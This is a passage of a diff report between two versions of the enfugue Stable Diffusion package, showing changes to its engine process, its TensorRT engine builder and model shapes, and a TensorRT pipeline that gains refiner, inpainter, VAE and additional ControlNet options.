         progress_callback = self.create_progress_callback(instruction_id)
         if intermediate_dir is not None:
-            image_callback = self.create_image_callback(
-                instruction_id, intermediate_dir=intermediate_dir
-            )
+            image_callback = self.create_image_callback(instruction_id, intermediate_dir=intermediate_dir)
         else:
             image_callback = None
 
         self.pipemanager.keepalive_callback = lambda: progress_callback(0, 0, 0.0)
 
         return plan.execute(
             self.pipemanager,
@@ -155,47 +153,60 @@
 
         return callback
 
     def check_invoke_kwargs(
         self,
         instruction_id: int,
         model: Optional[str] = None,
+        refiner: Optional[str] = None,
+        inpainter: Optional[str] = None,
         lora: Optional[Union[str, Tuple[str, float], List[Union[str, Tuple[str, float]]]]] = None,
         inversion: Optional[Union[str, List[str]]] = None,
         controlnet: Optional[str] = None,
+        vae: Optional[str] = None,
         control_image: Optional[Union[str, PIL.Image.Image]] = None,
         seed: Optional[int] = None,
         image_callback_steps: Optional[int] = None,
         build_tensorrt: Optional[bool] = None,
         intermediate_dir: Optional[str] = None,
         width: Optional[int] = None,
         height: Optional[int] = None,
         chunking_size: Optional[int] = None,
         guidance_scale: Optional[float] = None,
         num_inference_steps: Optional[int] = None,
         size: Optional[int] = None,
+        refiner_size: Optional[int] = None,
+        inpainter_size: Optional[int] = None,
+        process_control_image: bool = True,
         **kwargs: Any,
     ) -> dict:
         """
         Sets local vars which will rebuild the pipeline if required
         """
         kwargs["progress_callback"] = self.create_progress_callback(instruction_id)
         if intermediate_dir is not None and image_callback_steps is not None:
-            kwargs["latent_callback"] = self.create_image_callback(
-                instruction_id, intermediate_dir=intermediate_dir
-            )
+            kwargs["latent_callback"] = self.create_image_callback(instruction_id, intermediate_dir=intermediate_dir)
             kwargs["latent_callback_steps"] = image_callback_steps
             kwargs["latent_callback_type"] = "pil"
         else:
             kwargs["latent_callback"] = None
 
         self.pipemanager.keepalive_callback = lambda: kwargs["progress_callback"](0, 0, 0.0)
 
         if model is not None:
-            self.pipemanager.model = model
+            self.pipemanager.model = model  # type: ignore
+
+        if refiner is not None:
+            self.pipemanager.refiner = refiner  # type: ignore
+
+        if inpainter is not None:
+            self.pipemanager.inpainter = inpainter  # type: ignore
+
+        if vae is not None:
+            self.pipemanager.vae = vae  # type: ignore
 
         if seed is not None:
             self.pipemanager.seed = seed
 
         if lora is not None:
             self.pipemanager.lora = lora  # type: ignore
 
@@ -206,25 +217,46 @@
             self.pipemanager.build_tensorrt = build_tensorrt
 
         if controlnet is not None:
             self.pipemanager.controlnet = controlnet  # type: ignore
             if control_image is not None:
                 if isinstance(control_image, str):
                     control_image = PIL.Image.open(control_image)
-                if controlnet == "canny":
-                    control_image = self.pipemanager.edge_detector.canny(control_image)
-                elif controlnet == "mlsd":
-                    control_image = self.pipemanager.edge_detector.mlsd(control_image)
-                elif controlnet == "hed":
-                    control_image = self.pipemanager.edge_detector.hed(control_image)
+                if process_control_image:
+                    if controlnet == "canny":
+                        control_image = self.pipemanager.edge_detector.canny(control_image)
+                    elif controlnet == "hed":
+                        control_image = self.pipemanager.edge_detector.hed(control_image)
+                    elif controlnet == "scribble":
+                        control_image = self.pipemanager.edge_detector.hed(control_image, scribble=True)
+                    elif controlnet == "pidi":
+                        control_image = self.pipemanager.edge_detector.pidi(control_image)
+                    elif controlnet == "depth":
+                        control_image = self.pipemanager.depth_detector.midas(control_image)
+                    elif controlnet == "normal":
+                        control_image = self.pipemanager.depth_detector.normal(control_image)
+                    elif controlnet == "pose":
+                        control_image = self.pipemanager.pose_detector.detect(control_image)
+                    elif controlnet == "line":
+                        control_image = self.pipemanager.line_detector.detect(control_image)
+                    elif controlnet == "anime":
+                        control_image = self.pipemanager.line_detector.detect(control_image, anime=True)
+                    elif controlnet == "mlsd":
+                        control_image = self.pipemanager.line_detector.mlsd(control_image)
                 kwargs["control_image"] = control_image
 
         if size is not None:
             self.pipemanager.size = size
 
+        if refiner_size is not None:
+            self.pipemanager.refiner_size = refiner_size
+
+        if inpainter_size is not None:
+            self.pipemanager.inpainter_size = inpainter_size
+
         if width is not None:
             kwargs["width"] = int(width)
 
         if height is not None:
             kwargs["height"] = int(height)
 
         if chunking_size is not None:
@@ -293,61 +325,50 @@
                                 f"Reached maximum idle time after {idle_seconds:.1f} seconds, exiting engine process"
                             )
                             return
                         continue
                     except Exception as ex:
                         if logger.isEnabledFor(logging.DEBUG):
                             logger.debug(traceback.format_exc())
-                        raise IOError(
-                            "Received unexpected {0}, process will exit. {1}".format(
-                                type(ex).__name__, ex
-                            )
-                        )
+                        raise IOError("Received unexpected {0}, process will exit. {1}".format(type(ex).__name__, ex))
 
                     instruction = Serializer.deserialize(payload)
                     if not isinstance(instruction, dict):
                         logger.error(f"Unexpected non-dictionary argument {instruction}")
                         continue
 
                     instruction_id = instruction["id"]
                     instruction_action = instruction["action"]
                     instruction_payload = instruction.get("payload", None)
 
-                    logger.debug(
-                        f"Received instruction {instruction_id}, action {instruction_action}"
-                    )
+                    logger.debug(f"Received instruction {instruction_id}, action {instruction_action}")
                     if instruction_action == "ping":
                         logger.debug("Responding with 'pong'")
-                        self.results.put(
-                            Serializer.serialize({"id": instruction_id, "result": "pong"})
-                        )
+                        self.results.put(Serializer.serialize({"id": instruction_id, "result": "pong"}))
                     elif instruction_action in ["exit", "stop"]:
                         logger.debug("Exiting process")
-                        self.pipemanager.unload_pipeline()
-                        self.pipemanager.unload_upscaler()
+                        self.pipemanager.unload_inpainter("exiting")
+                        self.pipemanager.unload_refiner("exiting")
+                        self.pipemanager.unload_pipeline("exiting")
                         return
                     elif instruction_action in ["invoke", "plan"]:
                         response = {"id": instruction_id, "payload": instruction_payload}
                         try:
                             if instruction_action == "plan":
                                 intermediate_dir = instruction_payload.get("intermediate_dir", None)
-                                intermediate_steps = instruction_payload.get(
-                                    "intermediate_steps", None
-                                )
+                                intermediate_steps = instruction_payload.get("intermediate_steps", None)
                                 plan = self.get_diffusion_plan(instruction_payload)
                                 response["result"] = self.execute_diffusion_plan(
                                     instruction_id,
                                     plan,
                                     intermediate_dir=intermediate_dir,
                                     intermediate_steps=intermediate_steps,
                                 )
                             else:
-                                payload = self.check_invoke_kwargs(
-                                    instruction_id, **instruction_payload
-                                )
+                                payload = self.check_invoke_kwargs(instruction_id, **instruction_payload)
                                 response["result"] = self.pipemanager(**payload)
                         except Exception as ex:
                             response["error"] = qualify(type(ex))
                             response["message"] = str(ex)
                             if logger.isEnabledFor(logging.DEBUG):
                                 response["trace"] = traceback.format_exc()
```

### Comparing `enfugue-0.1.3/enfugue/diffusion/rt/engine.py` & `enfugue-0.2.0/enfugue/diffusion/rt/engine.py`

 * *Files 2% similar despite different names*

```diff
@@ -127,24 +127,20 @@
                 shape = self.engine.get_binding_shape(binding)
 
             dtype = trt.nptype(self.engine.get_binding_dtype(binding))
 
             if self.engine.binding_is_input(binding):
                 self.context.set_binding_shape(i, shape)
 
-            tensor = torch.empty(tuple(shape), dtype=DTypeConverter.from_numpy(dtype)).to(
-                device=device
-            )
+            tensor = torch.empty(tuple(shape), dtype=DTypeConverter.from_numpy(dtype)).to(device=device)
             self.tensors[binding] = tensor
             self.buffers[binding] = cuda.DeviceView(ptr=tensor.data_ptr(), shape=shape, dtype=dtype)
             logger.debug(f"Binding {binding} to tensor of shape {shape}")
 
-    def infer(
-        self, feeds: Dict[str, cuda.DeviceView], stream: cuda.Stream
-    ) -> OrderedDict[str, torch.Tensor]:
+    def infer(self, feeds: Dict[str, cuda.DeviceView], stream: cuda.Stream) -> OrderedDict[str, torch.Tensor]:
         """
         Runs inference through the engine.
         """
         start_binding, end_binding = trt_util.get_active_profile_bindings(self.context)
 
         # Shallow copy of ordered dict
         device_buffers = copy(self.buffers)
@@ -211,17 +207,15 @@
         profile = TRTProfile()
         if input_profile:
             for name, dims in input_profile.items():
                 profile.add(name, min=dims[0], opt=dims[1], max=dims[2])
 
         config_kwargs: dict[str, Any] = {}
 
-        config_kwargs["preview_features"] = [
-            trt.PreviewFeature.DISABLE_EXTERNAL_TACTIC_SOURCES_FOR_CORE_0805
-        ]
+        config_kwargs["preview_features"] = [trt.PreviewFeature.DISABLE_EXTERNAL_TACTIC_SOURCES_FOR_CORE_0805]
         if enable_preview:
             # Faster dynamic shapes made optional since it increases engine build time.
             config_kwargs["preview_features"].append(trt.PreviewFeature.FASTER_DYNAMIC_SHAPES_0805)
         if workspace_size > 0:
             config_kwargs["memory_pool_limits"] = {trt.MemoryPoolType.WORKSPACE: workspace_size}
         if not enable_all_tactics:
             config_kwargs["tactic_sources"] = []
@@ -229,15 +223,15 @@
         config = TRTCreateConfig(
             fp16=use_fp16,
             profiles=[profile],
             load_timing_cache=timing_cache,
             **config_kwargs,
         )
         engine = engine_from_network(
-            network_from_onnx_path(onnx_path),
+            network_from_onnx_path(onnx_path, flags=[trt.OnnxParserFlag.NATIVE_INSTANCENORM]),
             config=config,
             save_timing_cache=timing_cache,
         )
         save_engine(engine, self.engine_path)
 
     @staticmethod
     def build_all(
@@ -266,17 +260,15 @@
             if force_engine_rebuild or not os.path.exists(engine_path):
                 logger.debug(f"Building engine for {model_name} at {model_dir}")
                 if force_engine_rebuild or not os.path.exists(onnx_opt_path):
                     if force_engine_rebuild or not os.path.exists(onnx_path):
                         logger.debug(f"Exporting model to {onnx_path}")
                         model = model_obj.get_model()
                         with torch.inference_mode(), torch.autocast("cuda"):
-                            inputs = model_obj.get_sample_input(
-                                opt_batch_size, opt_image_height, opt_image_width
-                            )
+                            inputs = model_obj.get_sample_input(opt_batch_size, opt_image_height, opt_image_width)
                             torch.onnx.export(
                                 model,
                                 inputs,
                                 onnx_path,
                                 export_params=True,
                                 opset_version=onnx_opset,
                                 do_constant_folding=True,
```

### Comparing `enfugue-0.1.3/enfugue/diffusion/rt/model/base.py` & `enfugue-0.2.0/enfugue/diffusion/rt/model/base.py`

 * *Files 8% similar despite different names*

```diff
@@ -93,17 +93,15 @@
         static_shape: bool,
     ) -> Dict[str, List[Tuple[int, ...]]]:
         """
         Gets the min/opt/max dimensions for all input names
         """
         raise NotImplementedError()
 
-    def get_shape_dict(
-        self, batch_size: int, image_height: int, image_width: int
-    ) -> Dict[str, Tuple[int, ...]]:
+    def get_shape_dict(self, batch_size: int, image_height: int, image_width: int) -> Dict[str, Tuple[int, ...]]:
         """
         Gets the optimal dimensions for all inputs and outputs
         """
         raise NotImplementedError()
 
     def optimize(self, onnx_graph: ONNXModel) -> ONNXModel:
         """
@@ -127,21 +125,15 @@
     def get_minmax_dims(
         self,
         batch_size: int,
         image_height: int,
         image_width: int,
         static_batch: bool,
         static_shape: bool,
-    ) -> Tuple[
-        Tuple[int, int],
-        Tuple[int, int],
-        Tuple[int, int],
-        Tuple[int, int],
-        Tuple[int, int],
-    ]:
+    ) -> Tuple[Tuple[int, int], Tuple[int, int], Tuple[int, int], Tuple[int, int], Tuple[int, int],]:
         """
         Gets min/max for:
             batch
             image_height
             image_width
             latent_height
             latent_width
```

### Comparing `enfugue-0.1.3/enfugue/diffusion/rt/model/clip.py` & `enfugue-0.2.0/enfugue/diffusion/rt/model/clip.py`

 * *Files 4% similar despite different names*

```diff
@@ -77,26 +77,22 @@
             "input_ids": [
                 (min_batch, self.text_maxlen),
                 (batch_size, self.text_maxlen),
                 (max_batch, self.text_maxlen),
             ]
         }
 
-    def get_shape_dict(
-        self, batch_size: int, image_height: int, image_width: int
-    ) -> Dict[str, Tuple[int, ...]]:
+    def get_shape_dict(self, batch_size: int, image_height: int, image_width: int) -> Dict[str, Tuple[int, ...]]:
         self.check_dims(batch_size, image_height, image_width)
         return {
             "input_ids": (batch_size, self.text_maxlen),
             "text_embeddings": (batch_size, self.text_maxlen, self.embedding_dim),
         }
 
-    def get_sample_input(
-        self, batch_size: int, image_height: int, image_width: int
-    ) -> torch.Tensor:
+    def get_sample_input(self, batch_size: int, image_height: int, image_width: int) -> torch.Tensor:
         self.check_dims(batch_size, image_height, image_width)
         return torch.zeros(batch_size, self.text_maxlen, dtype=torch.int32, device=self.device)
 
     def optimize(self, onnx_graph: ONNXModel) -> ONNXModel:
         return Optimizer.run(
             onnx_graph,
             select_inputs=[0],
```

### Comparing `enfugue-0.1.3/enfugue/diffusion/rt/model/controlledunet.py` & `enfugue-0.2.0/enfugue/diffusion/rt/model/controlledunet.py`

 * *Files 0% similar despite different names*

```diff
@@ -165,17 +165,15 @@
             "down_block_11": [
                 (2 * min_batch, 1280, min_latent_height // 8, min_latent_width // 8),
                 (2 * batch_size, 1280, latent_height // 8, latent_width // 8),
                 (2 * max_batch, 1280, max_latent_height // 8, max_latent_width // 8),
             ],
         }
 
-    def get_shape_dict(
-        self, batch_size: int, image_height: int, image_width: int
-    ) -> Dict[str, Tuple[int, ...]]:
+    def get_shape_dict(self, batch_size: int, image_height: int, image_width: int) -> Dict[str, Tuple[int, ...]]:
         latent_height, latent_width = self.check_dims(batch_size, image_height, image_width)
         return {
             "sample": (2 * batch_size, self.unet_dim, latent_height, latent_width),
             "encoder_hidden_states": (
                 2 * batch_size,
                 self.text_maxlen,
                 self.embedding_dim,
```

### Comparing `enfugue-0.1.3/enfugue/diffusion/rt/model/controlnet.py` & `enfugue-0.2.0/enfugue/diffusion/rt/model/controlnet.py`

 * *Files 0% similar despite different names*

```diff
@@ -131,17 +131,15 @@
             "controlnet_cond": [
                 (2 * min_batch, 3, image_height, image_width),
                 (2 * batch_size, 3, image_height, image_width),
                 (2 * max_batch, 3, image_height, image_width),
             ],
         }
 
-    def get_shape_dict(
-        self, batch_size: int, image_height: int, image_width: int
-    ) -> Dict[str, Tuple[int, ...]]:
+    def get_shape_dict(self, batch_size: int, image_height: int, image_width: int) -> Dict[str, Tuple[int, ...]]:
         latent_height, latent_width = self.check_dims(batch_size, image_height, image_width)
         return {
             "sample": (2 * batch_size, self.unet_dim, latent_height, latent_width),
             "encoder_hidden_states": (
                 2 * batch_size,
                 self.text_maxlen,
                 self.embedding_dim,
```

### Comparing `enfugue-0.1.3/enfugue/diffusion/rt/model/unet.py` & `enfugue-0.2.0/enfugue/diffusion/rt/model/unet.py`

 * *Files 1% similar despite different names*

```diff
@@ -66,17 +66,15 @@
             "encoder_hidden_states": [
                 (2 * min_batch, self.text_maxlen, self.embedding_dim),
                 (2 * batch_size, self.text_maxlen, self.embedding_dim),
                 (2 * max_batch, self.text_maxlen, self.embedding_dim),
             ],
         }
 
-    def get_shape_dict(
-        self, batch_size: int, image_height: int, image_width: int
-    ) -> Dict[str, Tuple[int, ...]]:
+    def get_shape_dict(self, batch_size: int, image_height: int, image_width: int) -> Dict[str, Tuple[int, ...]]:
         latent_height, latent_width = self.check_dims(batch_size, image_height, image_width)
         return {
             "sample": (2 * batch_size, self.unet_dim, latent_height, latent_width),
             "encoder_hidden_states": (
                 2 * batch_size,
                 self.text_maxlen,
                 self.embedding_dim,
```

### Comparing `enfugue-0.1.3/enfugue/diffusion/rt/model/vae.py` & `enfugue-0.2.0/enfugue/diffusion/rt/model/vae.py`

 * *Files 5% similar despite different names*

```diff
@@ -57,26 +57,22 @@
             "latent": [
                 (min_batch, 4, min_latent_height, min_latent_width),
                 (batch_size, 4, latent_height, latent_width),
                 (max_batch, 4, max_latent_height, max_latent_width),
             ]
         }
 
-    def get_shape_dict(
-        self, batch_size: int, image_height: int, image_width: int
-    ) -> Dict[str, Tuple[int, ...]]:
+    def get_shape_dict(self, batch_size: int, image_height: int, image_width: int) -> Dict[str, Tuple[int, ...]]:
         latent_height, latent_width = self.check_dims(batch_size, image_height, image_width)
         return {
             "latent": (batch_size, 4, latent_height, latent_width),
             "images": (batch_size, 3, image_height, image_width),
         }
 
-    def get_sample_input(
-        self, batch_size: int, image_height: int, image_width: int
-    ) -> torch.Tensor:
+    def get_sample_input(self, batch_size: int, image_height: int, image_width: int) -> torch.Tensor:
         latent_height, latent_width = self.check_dims(batch_size, image_height, image_width)
         return torch.randn(
             batch_size,
             4,
             latent_height,
             latent_width,
             dtype=torch.float32,
```

### Comparing `enfugue-0.1.3/enfugue/diffusion/rt/optimizer.py` & `enfugue-0.2.0/enfugue/diffusion/rt/optimizer.py`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/diffusion/rt/pipeline.py` & `enfugue-0.2.0/enfugue/diffusion/rt/pipeline.py`

 * *Files 16% similar despite different names*

```diff
@@ -3,17 +3,22 @@
 
 from typing import Optional, List, Dict, Iterator, Any, Union, Tuple
 from typing_extensions import Self
 
 from contextlib import contextmanager
 
 from polygraphy import cuda
-from transformers import CLIPImageProcessor, CLIPTextModel, CLIPTokenizer
+from transformers import (
+    CLIPImageProcessor,
+    CLIPTokenizer,
+    CLIPTextModel,
+    CLIPTextModelWithProjection,
+)
 
-from diffusers.schedulers import KarrasDiffusionSchedulers
+from diffusers.schedulers import KarrasDiffusionSchedulers, DDIMScheduler
 from diffusers.models import AutoencoderKL, UNet2DConditionModel, ControlNetModel
 
 from diffusers.pipelines.stable_diffusion import StableDiffusionSafetyChecker
 
 from enfugue.util import logger
 from enfugue.diffusion.pipeline import EnfugueStableDiffusionPipeline
 from enfugue.diffusion.util import DTypeConverter
@@ -21,26 +26,33 @@
 from enfugue.diffusion.rt.model import BaseModel, UNet, VAE, CLIP, ControlledUNet, ControlNet
 
 
 class EnfugueTensorRTStableDiffusionPipeline(EnfugueStableDiffusionPipeline):
     models: Dict[str, BaseModel]
     engine: Dict[str, Engine]
     unet: UNet2DConditionModel
+    scheduler: KarrasDiffusionSchedulers
+    multi_scheduler: Optional[KarrasDiffusionSchedulers]
 
     def __init__(
         self,
         vae: AutoencoderKL,
         text_encoder: CLIPTextModel,
+        text_encoder_2: Optional[CLIPTextModelWithProjection],
         tokenizer: CLIPTokenizer,
+        tokenizer_2: Optional[CLIPTokenizer],
         unet: UNet2DConditionModel,
         controlnet: Optional[ControlNetModel],
         scheduler: KarrasDiffusionSchedulers,
         safety_checker: StableDiffusionSafetyChecker,
         feature_extractor: CLIPImageProcessor,
+        multi_scheduler: Optional[KarrasDiffusionSchedulers] = None,
         requires_safety_checker: bool = True,
+        force_zeros_for_empty_prompt: bool = True,
+        requires_aesthetic_score: bool = False,
         engine_size: int = 512,  # Recommended even for machines that can handle more
         chunking_size: int = 32,
         chunking_blur: int = 64,
         max_batch_size: int = 16,
         # ONNX export parameters
         force_engine_rebuild: bool = False,
         vae_engine_dir: Optional[str] = None,
@@ -50,26 +62,31 @@
         controlnet_engine_dir: Optional[str] = None,
         build_static_batch: bool = False,
         build_dynamic_shape: bool = False,
         build_preview_features: bool = False,
         onnx_opset: int = 17,
     ) -> None:
         super(EnfugueTensorRTStableDiffusionPipeline, self).__init__(
-            vae,
-            text_encoder,
-            tokenizer,
-            unet,
-            controlnet,
-            scheduler,
-            safety_checker,
-            feature_extractor,
-            requires_safety_checker,
-            engine_size,
-            chunking_size,
-            chunking_blur,
+            vae=vae,
+            text_encoder=text_encoder,
+            text_encoder_2=text_encoder_2,
+            tokenizer=tokenizer,
+            tokenizer_2=tokenizer_2,
+            unet=unet,
+            controlnet=controlnet,
+            scheduler=scheduler,
+            safety_checker=safety_checker,
+            feature_extractor=feature_extractor,
+            multi_scheduler=multi_scheduler,
+            requires_safety_checker=requires_safety_checker,
+            force_zeros_for_empty_prompt=force_zeros_for_empty_prompt,
+            requires_aesthetic_score=requires_aesthetic_score,
+            engine_size=engine_size,
+            chunking_size=chunking_size,
+            chunking_blur=chunking_blur,
         )
 
         if self.controlnet is not None:
             # Hijack forward
             self.unet.forward = self.controlled_unet_forward
         self.vae.forward = self.vae.decode
         self.onnx_opset = onnx_opset
@@ -80,30 +97,37 @@
         self.controlled_unet_engine_dir = controlled_unet_engine_dir
         self.controlnet_engine_dir = controlnet_engine_dir
         self.build_static_batch = build_static_batch
         self.build_dynamic_shape = build_dynamic_shape
         self.build_preview_features = build_preview_features
         self.max_batch_size = max_batch_size
 
-        # TODO: Restrict batch size to 4 for larger image dimensions as a WAR for TensorRT limitation.
         if self.build_dynamic_shape or self.engine_size > 512:
             self.max_batch_size = 4
 
+        # Set default to DDIM - The PNDM default that some models have does not work with TRT
+        if not isinstance(self.scheduler, DDIMScheduler):
+            logger.debug(f"TensorRT pipeline changing default scheduler from {type(self.scheduler).__name__} to DDIM")
+            self.scheduler = DDIMScheduler.from_config(self.scheduler_config)
+        if self.multi_scheduler is not None and not isinstance(self.multi_scheduler, DDIMScheduler):
+            logger.debug(
+                f"TensorRT pipeline changing default multi-diffusion scheduler from {type(self.multi_scheduler).__name__} to DDIM"
+            )
+            self.multi_scheduler = DDIMScheduler.from_config(self.multi_scheduler_config)
+
         self.stream = None  # loaded in load_resources()
         self.models = {}  # loaded in load_models()
         self.engine = {}  # loaded in build_engines()
 
     @staticmethod
     def device_view(t: torch.Tensor) -> cuda.DeviceView:
         """
         Gets a device view over a tensor
         """
-        return cuda.DeviceView(
-            ptr=t.data_ptr(), shape=t.shape, dtype=DTypeConverter.from_torch(t.dtype)
-        )
+        return cuda.DeviceView(ptr=t.data_ptr(), shape=t.shape, dtype=DTypeConverter.from_torch(t.dtype))
 
     def controlled_unet_forward(self, *args, **kwargs):
         """
         Highjacks unet forwarding.
         """
         sample, timestep, embeddings, mid_block = args[:4]
         down_blocks = args[4:]
@@ -126,17 +150,15 @@
             "max_batch_size": self.max_batch_size,
             "embedding_dim": self.embedding_dim,
             "use_fp16": use_fp16,
         }
         if self.clip_engine_dir is not None:
             self.models["clip"] = CLIP(self.text_encoder, **models_args)
         if self.unet_engine_dir is not None:
-            self.models["unet"] = UNet(
-                self.unet, unet_dim=self.unet.config.in_channels, **models_args
-            )
+            self.models["unet"] = UNet(self.unet, unet_dim=self.unet.config.in_channels, **models_args)
         if self.controlled_unet_engine_dir is not None:
             self.models["controlledunet"] = ControlledUNet(
                 self.unet, unet_dim=self.unet.config.in_channels, **models_args
             )
         if self.controlnet_engine_dir is not None and self.controlnet is not None:
             self.models["controlnet"] = ControlNet(
                 self.controlnet, unet_dim=self.unet.config.in_channels, **models_args
@@ -154,26 +176,30 @@
         for model_name, obj in self.models.items():
             self.engine[model_name].allocate_buffers(
                 shape_dict=obj.get_shape_dict(batch_size, image_height, image_width),
                 device=self.torch_device,
             )
 
     @contextmanager
-    def get_runtime_context(
-        self, batch_size: int, device: Union[str, torch.device]
-    ) -> Iterator[None]:
+    def get_runtime_context(self, batch_size: int, device: Union[str, torch.device]) -> Iterator[None]:
         """
         We initialize the TensorRT runtime here.
         """
         self.load_resources(self.engine_size, self.engine_size, batch_size)
         with (
             torch.inference_mode(),
             torch.autocast(device.type if isinstance(device, torch.device) else device),
             trt.Runtime(trt.Logger(trt.Logger.ERROR)),
         ):
+            if self.vae is not None and self.vae_engine_dir is None:
+                self.vae.to(device)
+            if self.controlnet is not None and self.controlnet_engine_dir is None:
+                self.controlnet.to(device)
+            if self.text_encoder is not None and self.clip_engine_dir is None:
+                self.text_encoder.to(device)
             if self.unet_engine_dir is not None or self.controlled_unet_engine_dir is not None:
                 logger.info("TensorRT unloading UNET")
                 self.unet = self.unet.to("cpu")
             yield
             if self.unet_engine_dir is not None or self.controlled_unet_engine_dir is not None:
                 logger.info("TensorRT reloading UNET")
                 self.unet = self.unet.to(device)
@@ -185,14 +211,19 @@
         torch_dtype: torch.dtype = torch.float16,
     ) -> Self:
         """
         First follow the parent to(), then load engines.
         """
         super().to(torch_device, silence_dtype_warnings=silence_dtype_warnings)
 
+        if torch_device == "cpu" or isinstance(torch_device, torch.device) and torch_device.type == "cpu":
+            return self
+        elif getattr(self, "_built", False):
+            return self
+
         # set device
         self.torch_device = self._execution_device
 
         # load models
         use_fp16 = torch_dtype is torch.float16
         self.load_models(use_fp16)
 
@@ -217,57 +248,65 @@
             opt_image_width=self.engine_size,
             force_engine_rebuild=self.force_engine_rebuild,
             static_batch=self.build_static_batch,
             static_shape=not self.build_dynamic_shape,
             enable_preview=self.build_preview_features,
         )
 
+        self._built = True
         return self
 
     def create_latents(
         self,
         batch_size: int,
         num_channels_latents: int,
         height: int,
         width: int,
         dtype: Union[str, torch.dtype],
         device: Union[str, torch.device],
         generator: Optional[torch.Generator] = None,
+        scheduler: Optional[KarrasDiffusionSchedulers] = None,
     ) -> torch.Tensor:
         """
         Override to change to float32
         """
         return super(EnfugueTensorRTStableDiffusionPipeline, self).create_latents(
-            batch_size,
-            num_channels_latents,
-            height,
-            width,
-            torch.float32,
-            device,
-            generator,
+            batch_size, num_channels_latents, height, width, torch.float32, device, generator, scheduler=scheduler
         )
 
     def encode_prompt(
         self,
-        prompt: Optional[Union[str, List[str]]] = None,
-        negative_prompt: Optional[Union[str, List[str]]] = None,
-    ) -> torch.Tensor:
+        prompt: Optional[str],
+        device: torch.device,
+        num_images_per_prompt: int = 1,
+        do_classifier_free_guidance: bool = False,
+        negative_prompt: Optional[str] = None,
+        prompt_embeds: Optional[torch.Tensor] = None,
+        negative_prompt_embeds: Optional[torch.Tensor] = None,
+        lora_scale: Optional[float] = None,
+    ) -> Union[torch.Tensor, Tuple[torch.Tensor, torch.Tensor, torch.Tensor, torch.Tensor]]:
         """
         Encodes the prompt into text encoder hidden states.
         Args:
              prompt (`str` or `List[str]`, *optional*):
                 prompt to be encoded
             negative_prompt (`str` or `List[str]`, *optional*):
                 The prompt or prompts not to guide the image generation. If not defined, one has to pass
                 `negative_prompt_embeds`. instead. If not defined, one has to pass `negative_prompt_embeds`. instead.
                 Ignored when not using guidance (i.e., ignored if `guidance_scale` is less than `1`).
         """
         if "clip" not in self.engine:
             return super(EnfugueTensorRTStableDiffusionPipeline, self).encode_prompt(
-                prompt, negative_prompt
+                prompt=prompt,
+                device=device,
+                num_images_per_prompt=num_images_per_prompt,
+                do_classifier_free_guidance=do_classifier_free_guidance,
+                negative_prompt=negative_prompt,
+                prompt_embeds=prompt_embeds,
+                negative_prompt_embeds=negative_prompt_embeds,
             )
 
         # Tokenize prompt
         text_input_ids = (
             self.tokenizer(
                 prompt,
                 padding="max_length",
@@ -279,17 +318,15 @@
             .to(self.torch_device)
         )
 
         text_input_ids_inp = self.device_view(text_input_ids)
         # NOTE: output tensor for CLIP must be cloned because it will be overwritten when called again for negative prompt
 
         text_embeddings = (
-            self.engine["clip"]
-            .infer({"input_ids": text_input_ids_inp}, self.stream)["text_embeddings"]
-            .clone()
+            self.engine["clip"].infer({"input_ids": text_input_ids_inp}, self.stream)["text_embeddings"].clone()
         )
 
         # Tokenize negative prompt
         uncond_input_ids = (
             self.tokenizer(
                 negative_prompt,
                 padding="max_length",
@@ -298,17 +335,17 @@
                 return_tensors="pt",
             )
             .input_ids.type(torch.int32)
             .to(self.torch_device)
         )
 
         uncond_input_ids_inp = self.device_view(uncond_input_ids)
-        uncond_embeddings = self.engine["clip"].infer(
-            {"input_ids": uncond_input_ids_inp}, self.stream
-        )["text_embeddings"]
+        uncond_embeddings = self.engine["clip"].infer({"input_ids": uncond_input_ids_inp}, self.stream)[
+            "text_embeddings"
+        ]
 
         # Concatenate the unconditional and text embeddings into a single batch to avoid doing two forward passes for classifier free guidance
         text_embeddings = torch.cat([uncond_embeddings, text_embeddings]).to(dtype=torch.float16)
 
         return text_embeddings
 
     def get_controlnet_conditioning_blocks(
@@ -320,31 +357,27 @@
         controlnet_cond: Optional[torch.Tensor],
         conditioning_scale: float,
     ) -> Tuple[Optional[List[torch.Tensor]], Optional[torch.Tensor]]:
         """
         Executes the controlnet inference
         """
         if "controlnet" not in self.engine:
-            return super(
-                EnfugueTensorRTStableDiffusionPipeline, self
-            ).get_controlnet_conditioning_blocks(
+            return super(EnfugueTensorRTStableDiffusionPipeline, self).get_controlnet_conditioning_blocks(
                 device=device,
                 latents=latents,
                 timestep=timestep,
                 encoder_hidden_states=encoder_hidden_states,
                 controlnet_cond=controlnet_cond,
                 conditioning_scale=conditioning_scale,
             )
         if controlnet_cond is None:
             return None, None
 
         timestep_float = timestep.float() if timestep.dtype != torch.float32 else timestep
-        conditioning_scale_tensor = torch.Tensor([conditioning_scale]).to(
-            dtype=torch.float32, device=device
-        )
+        conditioning_scale_tensor = torch.Tensor([conditioning_scale]).to(dtype=torch.float32, device=device)
         inference_kwargs = {
             "sample": self.device_view(latents),
             "timestep": self.device_view(timestep_float),
             "encoder_hidden_states": self.device_view(encoder_hidden_states),
             "controlnet_cond": self.device_view(controlnet_cond),
             "conditioning_scale": self.device_view(conditioning_scale_tensor),
         }
@@ -354,45 +387,44 @@
 
     def predict_noise_residual(
         self,
         latents: torch.Tensor,
         timestep: torch.Tensor,
         embeddings: torch.Tensor,
         cross_attention_kwargs: Optional[Dict[str, Any]] = None,
+        added_cond_kwargs: Optional[Dict[str, Any]] = None,
         down_block_additional_residuals: Optional[List[torch.Tensor]] = None,
         mid_block_additional_residual: Optional[torch.Tensor] = None,
     ) -> torch.Tensor:
         """
         Runs the RT engine inference on the unet
         """
         engine_name = "controlledunet"
         if engine_name not in self.engine:
             engine_name = "unet"
         if engine_name not in self.engine:
             return super(EnfugueTensorRTStableDiffusionPipeline, self).predict_noise_residual(
-                latents,
-                timestep,
-                embeddings,
-                cross_attention_kwargs,
-                down_block_additional_residuals,
-                mid_block_additional_residual,
+                latents=latents,
+                timestep=timestep,
+                embeddings=embeddings,
+                cross_attention_kwargs=cross_attention_kwargs,
+                added_cond_kwargs=added_cond_kwargs,
+                down_block_additional_residuals=down_block_additional_residuals,
+                mid_block_additional_residual=mid_block_additional_residual,
             )
 
         timestep_float = timestep.float() if timestep.dtype != torch.float32 else timestep
 
         inference_kwargs = {
             "sample": self.device_view(latents),
             "timestep": self.device_view(timestep_float),
             "encoder_hidden_states": self.device_view(embeddings),
         }
 
-        if (
-            down_block_additional_residuals is not None
-            and mid_block_additional_residual is not None
-        ):
+        if down_block_additional_residuals is not None and mid_block_additional_residual is not None:
             if engine_name == "unet":
